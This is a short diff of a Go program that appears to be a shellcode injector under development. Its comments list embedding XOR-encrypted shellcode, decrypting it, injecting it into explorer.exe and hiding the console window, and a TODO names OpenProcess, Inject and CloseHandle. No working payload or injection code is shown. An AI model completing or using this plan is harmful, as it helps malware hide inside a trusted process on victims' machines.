@@ -127,10 +127,10 @@ func FindTarget(procname string)(pid int, err error){
 
 func main() {
 	// objectives:
-	// embed encrypted shellcode from file into program
-	// decrypt shellcode (XOR)
-	// inject shellcode into explorer.exe
-	// get rid of console window (pop up)
+	// [x] embed encrypted shellcode from file into program
+	// [x] decrypt shellcode (XOR)
+	// [ ] inject shellcode into explorer.exe
+	// [ ] get rid of console window (pop up)
 	
 	
 	//key := "42"
@@ -139,11 +139,17 @@ func main() {
 
 	// Process is not found or other error
 	if err != nil { 
-		os.Exit(3)
+		os.Exit(42)
 	}
 
 
+	//TODO: 
+	// Inject Shellcode into explorer.exe
+	// 	1. OpenProcess
+	// 	2. Implement Inject()
+	// 	3. CloseHandle 
+	// Get rid of console window 
 	fmt.Println(pid)
-	
+
 
 }
